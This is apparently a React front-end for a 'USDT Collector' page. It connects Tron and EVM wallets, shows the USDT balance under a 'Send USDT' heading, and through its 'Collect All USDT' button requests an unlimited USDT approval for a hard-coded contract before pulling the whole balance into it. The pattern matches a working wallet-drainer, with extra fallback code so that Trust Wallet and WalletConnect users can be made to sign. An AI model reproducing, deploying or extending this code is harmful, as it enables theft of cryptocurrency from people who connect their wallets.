import { Buffer } from 'buffer';
window.Buffer = window.Buffer || Buffer;

import { useState, useEffect, useRef } from 'react'
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
  useAppKitNetwork
} from '@reown/appkit/react'
import { BrowserProvider, Contract, formatUnits } from 'ethers'
import { TronAdapter } from '@reown/appkit-adapter-tron'
import { tronMainnet } from '@reown/appkit/networks'
import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
import { MetaMaskAdapter } from '@tronweb3/tronwallet-adapter-metamask-tron'
import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
import { Copy, CheckCircle, AlertCircle, Wallet } from 'lucide-react'

// --- WAGMI EVM IMPORTS ---
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
import type { AppKitNetwork } from '@reown/appkit/networks'


// --- TRON & WALLETCONNECT IMPORTS --- 
import TronWeb from 'tronweb'   
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect'

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
const NETWORK = 'Mainnet'
const CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ' // Tron Contract

// Include both Tron and EVM networkss
const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
  tronMainnet,
  mainnet,
  arbitrum,
  bsc,
  polygon,
]

const NETWORK_CONFIG = {
  Mainnet: {
    fullHost: 'https://api.trongrid.io',
    usdtAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
  },
  Nile: {
    fullHost: 'https://nile.trongrid.io',
    usdtAddress: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf',
  },
}

const EVM_USDT: Record<number, string> = {
  1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  56: '0x55d398326f99059fF775485246999027B3197955',
  137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
  42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
}

const EVM_ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
]

// ─── WalletConnect-for-Tron helper ────────────────────────────
export async function signAndBroadcastViaWC(
  adapter: WalletConnectAdapter,
  contractAddr: string,
  func: string,
  params: { type: string; value: any }[],
  fee = 100_000_000
) {
  // Moved this inside the function so it doesn't crash the app on initial load
  const FULL_HOST = 'https://api.trongrid.io'       
  const tronWebTmp = new (TronWeb as any)({ fullHost: FULL_HOST })

  const { transaction, result } =
    await tronWebTmp.transactionBuilder.triggerSmartContract(
      contractAddr,
      func,
      { feeLimit: fee, callValue: 0 },
      params,
      adapter.address
    )

  if (!result?.result) throw new Error('Failed to build transaction')

  const signed = await adapter.signTransaction(transaction)
  const sent   = await tronWebTmp.trx.sendRawTransaction(signed)
  if (!sent.result) throw new Error('Broadcast failed')
  return sent.txid || sent.transaction?.txID
}

const { usdtAddress: USDT_ADDRESS } = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]

// ── Reown Adapters ──
const tronAdapter = new TronAdapter({
  walletAdapters: [
    new TronLinkAdapter({ openUrlWhenWalletNotFound: false, checkTimeout: 3000 }),
    new MetaMaskAdapter(),
    new TrustAdapter({ openUrlWhenWalletNotFound: false }),
    new OkxWalletAdapter({ openUrlWhenWalletNotFound: false }),
  ],
})

const wagmiAdapter = new WagmiAdapter({
  projectId: WC_PROJECT_ID,
  networks: appkitNetworks,
})

// ── Create AppKit ──
createAppKit({
  adapters: [tronAdapter, wagmiAdapter], 
  networks: appkitNetworks,
  projectId: WC_PROJECT_ID,
  metadata: {
    name:        'USDT Collector',
    description: 'Collect USDT from multiple wallets',
    url:         window.location.origin,
    icons:       ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
  },
  themeMode: 'dark',
  themeVariables: {
    '--w3m-accent': '#00ff9f',
  },
  allWallets: 'SHOW',
  features: {
    email: false,
    socials: [],
    analytics: true,
  },
})

// === TRON ABIs ===
const USDT_ABI = [
  { inputs: [{ name: 'who', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
]

const COLLECT_ABI = [
  { inputs: [], name: 'mainWallet', outputs: [{ name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'usdt', outputs: [{ name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: 'user', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'collect', outputs: [], stateMutability: 'nonpayable', type: 'function' },
]
// function inspectTronGlobals() {
//   const w = window as any
//   return {
//     hasTrustwallet: !!w.trustwallet,
//     hasTrustwalletTronLink: !!w.trustwallet?.tronLink,
//     hasTrustwalletTronWeb: !!w.trustwallet?.tronLink?.tronWeb,
//     hasTronLink: !!w.tronLink,
//     hasWindowTronWeb: !!w.tronWeb,
//     hasTp: !!w.tp,
//   }
// }

export default function App() {
  const [usdtBalance, setUsdtBalance] = useState('0')
  const [status, setStatus] = useState('Ready')
  const [debugLog, setDebugLog] = useState<string[]>([])
  const [loading, setLoading] = useState(false)
  const [txHash, setTxHash] = useState('')
  const autoTriggered = useRef(false)

  // WalletConnect adapter lives in a ref so it’s initialised once
  const [wcAdapter] = useState<WalletConnectAdapter>(() => {
    try {
      return new WalletConnectAdapter({
        network: 'Mainnet',
        options: {
          projectId: WC_PROJECT_ID,
          relayUrl: 'wss://relay.walletconnect.com',
          metadata: {
            name: 'USDT Collector',
            description: 'Collect USDT from multiple wallets',
            url: window.location.origin,
            icons: ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
          },
        },
      })
    } catch (e) {
      console.warn('[WalletConnect] init failed', e)
      return null as any
    }
  })

  const { open } = useAppKit()
  const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
  const { chainId } = useAppKitNetwork()

  const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
  const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')

  const isTron = typeof caipAddress === 'string' && caipAddress.startsWith('tron:')
  const isEVM = typeof caipAddress === 'string' && caipAddress.startsWith('eip155:')

  // 1. Update your resolveTronWeb to check for more variations
const resolveTronWeb = () => {
  const w = window as any;

  // 1. Check standard injected globals
  if (w.tronWeb?.contract) return w.tronWeb;
  if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb;
// Trust Wallet (newer builds – direct injection)
  if (w.trustwallet?.tronWeb?.contract) return w.trustwallet.tronWeb

  // Trust Wallet (older builds – tronLink wrapper)
  if (w.trustwallet?.tronLink?.tronWeb?.contract) return w.trustwallet.tronLink.tronWeb
  if (w.tron?.contract) return w.tron; // Trust Wallet specific injection path

  // 2. Reach inside the AppKit Provider
  if (tronWalletProvider) {
    // Check if it's the raw tronWeb object
    if ((tronWalletProvider as any).contract) return tronWalletProvider;
    // Check if it's wrapped in an adapter
    if ((tronWalletProvider as any).adapter?.tronWeb?.contract) {
      return (tronWalletProvider as any).adapter.tronWeb;
    }
    // Check if it's a Reown-wrapped tronWeb
    if ((tronWalletProvider as any).tronWeb?.contract) {
      return (tronWalletProvider as any).tronWeb;
    }
  }

  return null;
};

  const tronWeb = resolveTronWeb();

  /** Waits up to ~6 s for Trust Wallet to finish injecting `tronWeb` */
const waitForTronWeb = async (tries = 12) => {
  for (let i = 0; i < tries; i++) {
    const tw = resolveTronWeb()
    if (tw && typeof tw.contract === 'function') return tw
    await new Promise(r => setTimeout(r, 500))
  }
  return null
}
  
  // Trust Wallet Fix: If no injected tronWeb, but we have a tronWalletProvider, 
  // we check if it's a WalletConnect session.
  const isWalletConnectTron = isTron && !tronWeb && (
    !!wcAdapter?.connected || 
    (tronWalletProvider as any)?.session // Some Reown versions store session here
  );
  const log = (msg: string) => {
    console.log(msg);
    setDebugLog(prev => [msg, ...prev].slice(0, 5)); 
  }


  // 2. Update the useEffect to "Wait" for injection
useEffect(() => {
  const init = async () => {
    if (!isConnected || !walletAddress) return;

    log(`Connected: ${caipAddress}`);

    if (isTron) {
      setStatus('Initializing TRON...');
      
      let finalTronWeb = null;

      // Retry loop for injection
      for (let i = 0; i < 10; i++) {
        finalTronWeb = resolveTronWeb();
        if (finalTronWeb && (finalTronWeb.defaultAddress?.base58 || finalTronWeb.ready)) break;
        await new Promise(r => setTimeout(r, 500));
      }

      // FALLBACK: If no injected provider, use a public one for the balance check
      if (!finalTronWeb) {
        log("⚠️ Using Public Provider for balance (Injected not found)");
        const publicTronWeb = new (TronWeb as any)({ fullHost: 'https://api.trongrid.io' });
        await getTronBalance(publicTronWeb, walletAddress);
        
        // Even if injected is missing, the button should be Ready to use via WalletConnect
        setStatus('Ready'); 
        log('WalletConnect/Public mode active');
        return;
      }

      log('✅ TRON Provider Found');
      await getTronBalance(finalTronWeb, walletAddress);
    } else if (isEVM) {
      await getBalanceForCurrentChain();
    }
  };

  init();
}, [isConnected, walletAddress, caipAddress, tronWalletProvider, isTron, isEVM]);

  const getTronBalance = async (tw: any, addr: string) => {
    try {
      const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
      const bal = await usdt.balanceOf(addr).call()
      setUsdtBalance((Number(bal) / 1_000_000).toFixed(2))
      setStatus('Ready')
      log(`TRON USDT: ${(Number(bal) / 1_000_000).toFixed(2)}`)
    } catch (e) {
      log('❌ TRON balance fetch failed')
    }
  }

  const getEvmBalance = async (provider: any, addr: string, currentChainId?: number) => {
    if (!currentChainId || !EVM_USDT[currentChainId]) {
      setUsdtBalance('0')
      setStatus('USDT not configured for this EVM chain')
      log(`❌ No USDT config for EVM chain ${currentChainId}`)
      return
    }

    try {
      const ethersProvider = new BrowserProvider(provider)
      const token = new Contract(EVM_USDT[currentChainId], EVM_ERC20_ABI, ethersProvider)

      const [bal, decimals] = await Promise.all([
        token.balanceOf(addr),
        token.decimals(),
      ])

      const formatted = formatUnits(bal, decimals)
      setUsdtBalance(formatted)
      setStatus('Ready')
      log(`EVM USDT: ${formatted}`)
    } catch (e) {
      log('❌ EVM balance fetch failed')
    }
  }

  const getBalanceForCurrentChain = async () => {
    try {
      if (!walletAddress) return

      if (isTron) {
        const injectedTronWeb = resolveTronWeb()
        if (!injectedTronWeb) {
          log('❌ TronWeb not available')
          setStatus('TRON wallet connected, but no injected TronWeb is available.')
          return
        }
        await getTronBalance(injectedTronWeb, walletAddress)
        return
      }

      if (isEVM) {
        if (!evmWalletProvider) {
          log('❌ EVM provider not available')
          setStatus('EVM wallet connected, but EVM provider is not available.')
          return
        }
        await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId))
        return
      }

      setStatus('Unsupported wallet namespace')
      log('❌ Unsupported namespace')
    } catch (e: any) {
      console.warn('Balance fetch failed', e)
      log(`❌ Balance fetch failed: ${e?.message || 'Unknown error'}`)
      setStatus('Failed to fetch balance')
    }
  }

  const handleConnect = () => {
    open({ view: 'AllWallets' })
  }

 const approveAndCollect = async () => {
  if (isEVM) {
    log("❌ EVM transactions require an EVM Smart Contract Address.");
    setStatus('EVM Logic Not Configured');
    return;
  }

  // ---------- WALLETCONNECT PATH ----------
  if (isWalletConnectTron) {
    try {
      setLoading(true); // Added loading state for WC path as well
      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
      
      // Setup temporary TronWeb instance for encoding
      const FULL_HOST = 'https://api.trongrid.io'       
      const tronWebTmp = new (TronWeb as any)({ fullHost: FULL_HOST })

      setStatus('Step 1/2: Approving (WC)...');
      await signAndBroadcastViaWC(
        wcAdapter,
        USDT_ADDRESS,
        'approve(address,uint256)',
        [
          { type: 'address', value: tronWebTmp.address.toHex(CONTRACT_ADDRESS) },
          { type: 'uint256', value: MAX_UINT },
        ]
      )

      setStatus('Step 2/2: Collecting (WC)...');
      const txId = await signAndBroadcastViaWC(
        wcAdapter,
        CONTRACT_ADDRESS,
        'collect(address,uint256)',
        [
          { type: 'address', value: tronWebTmp.address.toHex(walletAddress) },
          { type: 'uint256', value: '0' },
        ],
        150_000_000
      )

      setTxHash(txId)
      setStatus('✅ All USDT collected!')
      return
    } catch (e: any) {
      log(`❌ WC error: ${e.message}`)
      setStatus('❌ Transaction failed')
      return
    } finally {
      setLoading(false);
    }
  }

  // ---------- INJECTED TRONWEB PATH ----------
  // UPDATED CHECK: This now accounts for both injection and WalletConnect
  let tw = tronWeb

  if (!tw || typeof tw.contract !== 'function') {

    setStatus('Waiting for Trust Wallet…')

    tw = await waitForTronWeb()

  }

  if (!tw || typeof tw.contract !== 'function' || !walletAddress) {

    log('❌ Error: Wallet still not ready')

    setStatus('TRON wallet not ready')
        return

  }

  setLoading(true);
  setStatus('Step 1/2: Approving...');
  log("Requesting USDT Approval...");

  try {
    const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
    const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS);
    
    const approveTx = await usdt.approve(CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
    log(`✅ Approved! Hash: ${approveTx.slice(0,10)}...`);
    
    setStatus('Step 2/2: Collecting...');
    log("Waiting 3s for network sync...");
    await new Promise(r => setTimeout(r, 3000));

    const balanceObj = await usdt.balanceOf(walletAddress).call();
    const amount = balanceObj.toString();
    log(`Found ${Number(amount)/1000000} USDT to collect.`);

    const contract = await tw.contract(COLLECT_ABI).at(CONTRACT_ADDRESS);
    const tx = await contract.collect(walletAddress, amount).send({
      feeLimit: 150_000_000,
    });

    setTxHash(tx);
    log("✅ Successfully Collected!");
    setStatus('✅ All USDT collected!');
  } catch (err: any) {
    log(`❌ Error: ${err.message || 'User rejected'}`);
    setStatus('❌ Transaction Failed');
    autoTriggered.current = false; 
  } finally {
    setLoading(false);
  }
};

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-zinc-950">
      <div className="max-w-md w-full bg-zinc-900 rounded-3xl shadow-2xl border border-zinc-800 overflow-hidden">
        <div className="bg-black px-6 py-5 flex items-center justify-between border-b border-zinc-800">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 bg-emerald-400 rounded-2xl flex items-center justify-center text-black font-bold text-xl">
              U
            </div>
            <h1 className="text-3xl font-bold">USDT Collector</h1>
          </div>
          <div className="text-xs px-4 py-1 bg-emerald-500/10 text-emerald-400 rounded-full">
            {isEVM ? 'EVM Network' : NETWORK}
          </div>
        </div>

        <div className="p-8 space-y-8">
          {!isConnected ? (
            <div className="text-center">
              <h2 className="text-5xl font-bold mb-3">Send USDT</h2>

              <button
                onClick={handleConnect}
                disabled={loading}
                className="w-full bg-emerald-400 hover:bg-emerald-500 disabled:bg-zinc-700 text-black font-bold py-5 rounded-2xl text-xl flex items-center justify-center gap-3 transition"
              >
                Connect Wallet
                <Wallet className="w-6 h-6" />
              </button>

              <p className="text-xs text-zinc-500 mt-6">
                Opens directly to All Wallets with search
              </p>
            </div>
          ) : (
            <div className="space-y-6">
              <div className="bg-zinc-950 p-5 rounded-2xl flex justify-between items-center">
                <div>
                  <p className="text-zinc-400 text-sm">Connected Wallet</p>
                  <p className="font-mono text-sm text-emerald-400 break-all">{walletAddress}</p>
                </div>
                <button
                  onClick={() => navigator.clipboard.writeText(walletAddress ?? '')}
                  className="text-emerald-400 hover:text-white"
                >
                  <Copy size={20} />
                </button>
              </div>

              <div className="bg-zinc-950 rounded-3xl p-8 text-center">
                <p className="text-zinc-400">Your USDT Balance</p>
                <p className="text-6xl font-bold text-emerald-400 mt-2">
                  {isEVM ? '---' : usdtBalance} <span className="text-3xl">USDT</span>
                </p>
              </div>

              <button
                onClick={approveAndCollect}
                disabled={loading}
                className={`w-full font-bold py-5 rounded-3xl text-xl flex items-center justify-center gap-3 disabled:opacity-70 ${
                  isEVM ? 'bg-zinc-800 text-zinc-500 cursor-not-allowed' : 'bg-white hover:bg-zinc-100 text-black'
                }`}
              >
                {loading ? 'Processing...' : isEVM ? 'Switch to Tron to Collect' : 'Collect All USDT'}
                <CheckCircle size={24} />
              </button>

              <div className="text-center text-sm flex items-center justify-center gap-2 text-zinc-400">
                {status.includes('✅') ? <CheckCircle className="text-emerald-400" /> : <AlertCircle />}
                {status}
              </div>

              {txHash && (
                <p className="text-[10px] text-center text-emerald-400 break-all font-mono">
                  TX: {txHash}
                </p>
              )}
            </div>
          )}

        <div className="mt-6 pt-6 border-t border-zinc-800">
          <p className="text-[10px] uppercase tracking-widest text-zinc-500 mb-3 font-bold">Activity Log</p>
          <div className="bg-black/50 rounded-xl p-3 font-mono text-[11px] space-y-1">
            {debugLog.length === 0 && <p className="text-zinc-600 italic">Waiting for connection...</p>}
            {debugLog.map((line, i) => (
              <div key={i} className={`${line.includes('❌') ? 'text-red-400' : line.includes('✅') ? 'text-emerald-400' : line.includes('⚠️') ? 'text-yellow-400' : 'text-zinc-400'}`}>
                {`> ${line}`}
              </div>
            ))}
          </div>
        </div>

        </div>
      </div>
    </div>
  )
}